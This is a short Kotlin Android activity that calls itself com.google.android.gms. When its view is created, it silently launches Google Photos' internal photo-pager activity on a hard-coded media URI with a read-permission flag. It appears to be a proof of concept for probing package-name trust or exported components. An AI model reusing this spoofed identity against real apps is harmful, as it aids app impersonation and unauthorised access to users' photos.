package com.google.android.gms

import android.annotation.SuppressLint
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.AttributeSet
import android.view.View

class MainActivity : Activity() {

    @SuppressLint("WrongConstant")
    override fun onCreateView(name: String, context: Context, attrs: AttributeSet): View? {
        val intent = Intent("com.android.camera.action.REVIEW")
        intent.data = Uri.parse("content://media/external/images/media/10321")
        intent.`package` = "com.google.android.apps.photos"
        intent.component = ComponentName.unflattenFromString("com.google.android.apps.photos/.pager.HostPhotoPagerActivity")
        intent.flags = 1

        context.startActivity(intent)

        return super.onCreateView(name, context, attrs)
    }

}